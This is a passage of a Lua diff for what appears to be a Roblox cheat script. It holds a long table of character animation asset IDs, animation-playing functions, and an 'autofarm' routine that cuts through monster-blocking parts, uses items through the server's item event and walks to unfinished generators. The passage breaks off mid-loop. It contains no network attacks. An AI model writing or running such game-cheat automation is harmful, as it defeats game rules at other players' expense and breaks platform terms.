+		extracting = "rbxassetid://18718380478",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18740791780",
+		twistedwalking = "rbxassetid://18740834988",
+		twistedrunning = "rbxassetid://18741061111",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Flutter = {
+		normalidle = "rbxassetid://18226198149",
+		normalwalking = "rbxassetid://18226261062",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://18226338406",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18226198149",
+		twistedwalking = "rbxassetid://18226261062",
+		twistedrunning = "rbxassetid://18239928544",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Flyte = {
+		normalidle = "rbxassetid://71907669576411",
+		normalwalking = "rbxassetid://132121208809384",
+		normalrunning = "rbxassetid://98768698423249",
+		extracting = "rbxassetid://80233910746374",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://101910614628814",
+		twistedwalking = "rbxassetid://102707652492072",
+		twistedrunning = "rbxassetid://105764212938666",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Gigi = {
+		normalidle = "rbxassetid://131680997351874",
+		normalwalking = "rbxassetid://79372488497037",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://88765331625241",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://138817858272409",
+		twistedwalking = "rbxassetid://112750898606111",
+		twistedrunning = "rbxassetid://124691439016513",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Ginger = {
+		normalidle = "rbxassetid://85220873784968",
+		normalwalking = "rbxassetid://79443874564334",
+		normalrunning = "rbxassetid://73716601731008",
+		extracting = "rbxassetid://76382478901588",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://82455189191938",
+		twistedwalking = "rbxassetid://87274628660556",
+		twistedrunning = "rbxassetid://75137556095690",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Glisten = {
+		normalidle = "rbxassetid://18789173875",
+		normalwalking = "rbxassetid://18789278688",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://18789412964",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18820870445",
+		twistedwalking = "rbxassetid://18821107251",
+		twistedrunning = "rbxassetid://18833020404",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Goob = {
+		normalidle = "rbxassetid://17231779680",
+		normalwalking = "rbxassetid://17231273641",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://16987946868",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17269810470",
+		twistedwalking = "rbxassetid://17269854881",
+		twistedrunning = "rbxassetid://17270072413",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Looey = {
+		normalidle = "rbxassetid://78197156369403",
+		normalwalking = "rbxassetid://124245470232056",
+		normalrunning = "rbxassetid://131545440842534",
+		extracting = "rbxassetid://124702329627784",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://112606771950932",
+		twistedwalking = "rbxassetid://100370803921306",
+		twistedrunning = "rbxassetid://131136472849981",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Pebble = {
+		normalidle = "rbxassetid://94925084807494",
+		normalwalking = "rbxassetid://108621188713265",
+		normalrunning = "rbxassetid://82078521925458",
+		extracting = "rbxassetid://130124125865280",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		oldtwistedidle = "rbxassetid://14544956730",
+		oldtwistedwalking = "rbxassetid://16468055582",
+		oldtwistedrunning = "rbxassetid://14640401802",
+		twistedidle = "rbxassetid://000000000000000000000000000000000000",
+		twistedwalking = "rbxassetid://000000000000000000000000000000000000",
+		twistedrunning = "rbxassetid://000000000000000000000000000000000000",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Poppy = {
+		normalidle = "rbxassetid://16205089554",
+		normalwalking = "rbxassetid://16409449646",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://16205888741",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17000127805",
+		twistedwalking = "rbxassetid://17000195059",
+		twistedrunning = "rbxassetid://17000654428",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	RazzleDazzle = {
+		oldnormalidle = "rbxassetid://17450844457",
+		oldnormalwalk = "rbxassetid://17451039864",
+		oldextracting = "rbxassetid://17452101828",
+		normalidle = "rbxassetid://000000000000000000000000000000000000",
+		normalwalking = "rbxassetid://000000000000000000000000000000000000",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://000000000000000000000000000000000000",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		oldtwistedidle = "rbxassetid://18987852729",
+		oldtwistedwalking = "rbxassetid://18987891015",
+		oldtwistedrunning = "rbxassetid://18987897664",
+		twistedidle = "rbxassetid://000000000000000000000000000000000000",
+		twistedwalking = "rbxassetid://000000000000000000000000000000000000",
+		twistedrunning = "rbxassetid://000000000000000000000000000000000000",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Rodger = {
+		normalidle = "rbxassetid://17097874814",
+		normalwalking = "rbxassetid://17097949440",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://17098030743",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17108594427",
+		twistedwalking = "rbxassetid://18988824994",
+		twistedrunning = "rbxassetid://18988830155",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Rudie = {
+		normalidle = "rbxassetid://80667484406688",
+		normalwalking = "rbxassetid://89752421989409",
+		normalrunning = "rbxassetid://139414767968411",
+		extracting = "rbxassetid://95207747046768",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://122501058377674",
+		twistedwalking = "rbxassetid://94861044577621",
+		twistedrunning = "rbxassetid://137822127469681",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Scraps = {
+		normalidle = "rbxassetid://17553394893",
+		normalwalking = "rbxassetid://17554165839",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://17559713038",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17573097161",
+		twistedwalking = "rbxassetid://17573173656",
+		twistedrunning = "rbxassetid://17574064271",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Shelly = {
+		normalidle = "rbxassetid://18199284470",
+		normalwalking = "rbxassetid://18199493442",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://18199567889",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18212982332",
+		twistedwalking = "rbxassetid://18213481024",
+		twistedrunning = "rbxassetid://18213671382",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Shrimpo = {
+		normalidle = "rbxassetid://17561045485",
+		normalwalking = "rbxassetid://17561196171",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://17561277632",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17592191827",
+		twistedwalking = "rbxassetid://17592227490",
+		twistedrunning = "rbxassetid://17592396609",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Sprout = {
+		normalidle = "rbxassetid://18555568169",
+		normalwalking = "rbxassetid://18578948869",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://18579081668",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18698546825",
+		twistedwalking = "rbxassetid://18698688472",
+		twistedrunning = "rbxassetid://18699674490",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Teagan = {
+		normalidle = "rbxassetid://18183602038",
+		normalwalking = "rbxassetid://18183710195",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://18184069793",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18196187882",
+		twistedwalking = "rbxassetid://18196889227",
+		twistedrunning = "rbxassetid://18197017631",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Tisha = {
+		normalidle = "rbxassetid://18152665882",
+		normalwalking = "rbxassetid://18152903980",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://18153373004",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://18167087346",
+		twistedwalking = "rbxassetid://18167280146",
+		twistedrunning = "rbxassetid://18167378530",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Toodles = {
+		normalidle = "rbxassetid://17504197216",
+		normalwalking = "rbxassetid://17504345651",
+		normalrunning = "rbxassetid://000000000000000000000000000000000000",
+		extracting = "rbxassetid://17506059864",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://17648960939",
+		twistedwalking = "rbxassetid://17649028343",
+		twistedrunning = "rbxassetid://91029796934547",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Vee = {
+		oldnormalidle = "rbxassetid://17293962722",
+		oldnormalwalk = "rbxassetid://17294160873",
+		oldextracting = "rbxassetid://17308901433",
+		normalidle = "rbxassetid://87154718270671",
+		normalwalking = "rbxassetid://97897738117999",
+		normalrunning = "rbxassetid://72678141337718",
+		extracting = "rbxassetid://106108686337103",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		oldtwistedidle = "rbxassetid://17320732816",
+		oldtwistedwalking = "rbxassetid://17320859447",
+		oldtwistedrunning = "rbxassetid://17322657144",
+		twistedidle = "rbxassetid://121275292923999",
+		twistedwalking = "rbxassetid://140422342173966",
+		twistedrunning = "rbxassetid://73725947198210",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+	Yatta = {
+		normalidle = "rbxassetid://94672939370149",
+		normalwalking = "rbxassetid://113493276030799",
+		normalrunning = "rbxassetid://121887597056169",
+		extracting = "rbxassetid://81195350931735",
+		normalability = "rbxassetid://000000000000000000000000000000000000",
+		quirk1 = "rbxassetid://000000000000000000000000000000000000",
+		quirk2 = "rbxassetid://000000000000000000000000000000000000",
+		quirk3 = "rbxassetid://000000000000000000000000000000000000",
+
+		twistedidle = "rbxassetid://118127032092109",
+		twistedwalking = "rbxassetid://130346494434784",
+		twistedrunning = "rbxassetid://104220653814120",
+		twistedability = "rbxassetid://000000000000000000000000000000000000",
+		attacking = "rbxassetid://000000000000000000000000000000000000",
+		lostinterest = "rbxassetid://000000000000000000000000000000000000",
+		extra1 = "rbxassetid://000000000000000000000000000000000000",
+		extra2 = "rbxassetid://000000000000000000000000000000000000",
+		extra3 = "rbxassetid://000000000000000000000000000000000000",
+	},
+}
+
+noxious["current animation track"] = nil
+noxious["current animation tracks"] = {}
+noxious["connection key"] = "default"
+
+function resetanims()
+	resetanimpack()
+	task.spawn(function()
+		if istposeloopenabled then return end
+		istposeloopenabled = true
+
+		tposeloopconnection = game:GetService("RunService").Heartbeat:Connect(function()
+			if istposeloopenabled then
+				pauseanims()
+			end
+		end)
+	end)
+	task.wait()
+	task.spawn(function()
+		local Char = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
+		local Human = Char and Char:WaitForChild("Humanoid", 15)
+		local Animate = Char and Char:WaitForChild("Animate", 15)
+
+		if Animate then
+			Animate.Disabled = true
+			for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+				v:Stop()
+			end
+			Animate.Disabled = false
+		end
+
+		if not istposeloopenabled then return end
+		istposeloopenabled = false
+
+		if tposeloopconnection then
+			tposeloopconnection:Disconnect()
+			tposeloopconnection = nil
+		end
+	end)
+end
+
+function stopanim()
+	local player = game.Players.LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+	if humanoid then
+		local animator = humanoid:FindFirstChildOfClass("Animator")
+		if animator then
+			for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+				track:Stop()
+			end
+		end
+	end
+
+	if noxious["current animation track"] then
+		noxious["current animation track"]:Stop()
+		noxious["current animation track"] = nil
+	end
+
+	if noxious["current animation tracks"][noxious["connection key"]] then
+		noxious["current animation tracks"][noxious["connection key"]]:Stop()
+		noxious["current animation tracks"][noxious["connection key"]] = nil
+	end
+end
+
+function playanim(animname)
+	resetanims()
+	stopanim()
+
+	task.wait(0.1)
+
+	local toon = targettoonanimations or ""
+
+	local toondata = noxious["animations"][toon]
+	if not toondata then return end
+
+	local animid = toondata[animname]
+	if not animid then return end
+	if animid == "rbxassetid://000000000000000000000000000000000000" then 
+		notify("This animation hasn't been properly implemented yet or doesn't exist.", 5, "error")
+		return 
+	end
+
+	local anim = Instance.new("Animation")
+	anim.AnimationId = animid
+
+	local track
+	local success, err = pcall(function()
+		track = noxious["humanoid"]:LoadAnimation(anim)
+	end)
+
+	if not success or not track then return end
+
+	track.Looped = animationlooped
+	track:AdjustSpeed(animationspeedinput or 1)
+	track:AdjustWeight(999)
+
+	track:Play()
+	noxious["current animation tracks"][noxious["connection key"]] = track
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+-- welcome to the autofarm gui
+dekaafenabled = false
+dekaaffactiveconnection = nil
+
+function dekaaf()
+	if not inrun() then return end
+	local pathf = game:GetService("PathfindingService")
+	local getresearch = false
+
+	local items = {
+		["Extracting"] = {
+			"ExtractionSpeedCandy",
+			"Valve",
+			"JumperCable",
+		},
+
+		["Healing"] = {
+			"Bandage",
+			"HealthKit",
+		},
+
+		["Extras"] = {
+			"ResearchCapsule",
+			"HolidayCollectibleItem",
+			"Tape",
+		}
+	}
+
+	for _, obj in pairs(workspace:GetDescendants()) do
+		if obj:IsA("BasePart") and obj.Name == "MonsterBlocker" then
+			local mod = Instance.new("PathfindingModifier")
+			mod.PassThrough = true
+			mod.Parent = obj
+		end
+	end
+
+	local agent = {
+		AgentRadius = 2,
+		AgentHeight = 5,
+		AgentCanJump = false,
+	}
+
+	local char = noxious["character"]
+	local lookforfurthest = false -- unused
+
+	local ineedtopaythebills = {
+		Healing = function()
+			if char.Humanoid.Health < 3 then
+				return true
+			end
+		end,
+
+		Extracting = function()
+			if char.Decoding.Value ~= nil then
+				return true
+			end
+		end,
+
+		Extras = function()
+			if getresearch then return true end
+		end,
+	}
+
+	function invTable()
+		local stuff = {}
+
+		for i,v in pairs(char:FindFirstChild("Inventory"):GetChildren()) do
+			table.insert(stuff,{Value = v.Value, Slot = v})
+		end
+
+		return stuff -- returns the slots name and then the slot in which where it is (if ur dumb)
+	end
+
+	function isUsableItem(model)
+		if not model or not model:IsA("Model") then return false end
+		for _, itemType in pairs(items) do
+			for _, name in pairs(itemType) do
+				if model.Name == name then
+					return true
+				end
+			end
+		end
+		return false
+	end
+
+	function needsItem(itemName)
+		for category, itemList in pairs(items) do
+			for _, item in pairs(itemList) do
+				if itemName == item then
+					return ineedtopaythebills[category]() -- check if item is needed
+				end
+			end
+		end
+		return false
+	end
+
+	function checkForUsables()
+		local Lel = invTable()
+		local used = false
+
+		for i,v in pairs(Lel) do
+			local item = v.Value
+			local theSlot = v.Slot
+
+			-- epic business momento
+
+			for key,x in pairs(items) do
+
+				-- ii = the item (extract or healing thing)
+				-- vv the item tables
+
+				for ii,vv in pairs(x) do
+					if vv:lower() == item:lower() then					
+						local CANWEUSEIT = ineedtopaythebills[key]()
+
+						if CANWEUSEIT == true then 
+							noxious["replicated storage"].Events.ItemEvent:InvokeServer(noxious["character"],theSlot)
+							used = true
+							break
+						end
+					end
+
+					if used then break end
+				end
+
+				if used then break end
+				game["Run Service"].RenderStepped:Wait()
+			end
+		end
+	end
+
+	local destiny = noxious["character"].PrimaryPart.Position
+
+	function getMap()
+		local elMap = workspace.CurrentRoom:FindFirstChildWhichIsA("Model")
+
+		return elMap
+	end
+
+	function getTwisteds()
+		local map = getMap()
+
+		if map then
+			map.Monsters:WaitForChild("Monsters")
+			return map.Monsters:GetChildren()
+		end
+
+		return nil
+	end
+
+	function markMonsterZones()
+		local map = getMap()
+		if not map then return end
+
+		local monsters = map:FindFirstChild("Monsters")
+		if not monsters then return end
+
+		for _, monster in pairs(monsters:GetChildren()) do
+			if monster:IsA("Model") and monster:FindFirstChild("HumanoidRootPart") then
+				local zone = Instance.new("Part")
+				zone.Size = Vector3.new(50, 10, 50)
+				zone.CFrame = monster.HumanoidRootPart.CFrame
+				zone.Anchored = true
+				zone.CanCollide = false
+				zone.Transparency = 1
+				zone.Name = "MonsterAvoidanceZone"
+
+				local modifier = Instance.new("PathfindingModifier")
+				modifier.Label = "AvoidMonster"
+				modifier.PassThrough = false
+				modifier.Parent = zone
+
+				zone.Parent = workspace
+				game.Debris:AddItem(zone, 1)
+			end
+		end
+	end
+
+	local busy = false
+	local elPrompt
+
+	workspace.Info.Panic.Changed:Connect(function()
+		if workspace.Info.Panic.Value == false then
+			busy = false
+		end
+	end)
+
+	noxious["replicated storage"].StoryEvents.Spotted.OnClientEvent:Connect(function()
+		--lookforfurthest = true
+		busy = false
+	end)
+
+	task.spawn(function() execcmd("elms") end)
+
+	local isreallyclosing = false
+	local hitbox = workspace.Elevators.Elevator.ElevatorHitBox
+
+	workspace.Info.Message.Changed:Connect(function()
+		if string.find(workspace.Info.Message.Value:lower(),"elevator is closing") then
+			if workspace.Info.Message.Value:sub(1,8) == "Quickly!" then
+				isreallyclosing = false
+				return
+			end
+
+			if not isreallyclosing then
+
+				isreallyclosing = true
+				busy = true
+
+				delay(.1,function()
+					busy = false
+				end)
+			end
+		end
+	end)
+
+	local checkForUpdates = tick()
+	local dandystorecheck  = false
+
+	while task.wait(1/240) do
+		if dekaafenabled then
+			local map = getMap()
+			local itemsva = false
+
+			if tick() - checkForUpdates > 0.5 then
+				task.spawn(function()
+					checkForUsables()
+					checkForUpdates = tick()
+				end)
+			end
+
+			if map then 
+
+				if not busy then
+					map:WaitForChild("Items")
+
+					local items = map.Items
+					local maxdist = 150
+
+		--[[for i,v in pairs(items:GetChildren()) do
+			if (eh[v.Name]) and v:IsA("Model") then
+				elPrompt = v
+				busy = true
+				itemsva = true
+				destiny = v:GetPivot().p
+				break
+			end
+		end]]
+				end
+
+				if map and not busy then
+					map:WaitForChild("Items")
+
+					local itemModels = map.Items:GetChildren()
+					local nearestUsable
+					local shortestDistance = math.huge
+					local myPos = char.PrimaryPart.Position
+
+					for _, itemModel in pairs(itemModels) do
+						if isUsableItem(itemModel) and needsItem(itemModel.Name) then
+							local dist = (itemModel:GetPivot().Position - myPos).Magnitude
+							if dist < shortestDistance and dist <= 100 then
+								shortestDistance = dist
+								nearestUsable = itemModel
+							end
+						end
+					end
+
+					if nearestUsable then
+						busy = true
+						destiny = nearestUsable:GetPivot().Position
+						elPrompt = nearestUsable
+					else
+						map:WaitForChild("Generators")
+						local foundValidGenerator = false
+
+						for _, gen in pairs(map.Generators:GetChildren()) do
+							if gen:IsA("Model") then
+								local stats = gen:FindFirstChild("Stats")
+								if stats then
+									local activePlayer = stats:FindFirstChild("ActivePlayer")
+									local completed = stats:FindFirstChild("Completed")
+
+									if completed and completed.Value == false and (not activePlayer or activePlayer.Value == nil) then
+										destiny = gen.Model.FakeValve.Position
+										elPrompt = gen
+										busy = true
+										foundValidGenerator = true
+										break
+									end
+								end
+							end
+						end
+
+						if not foundValidGenerator then
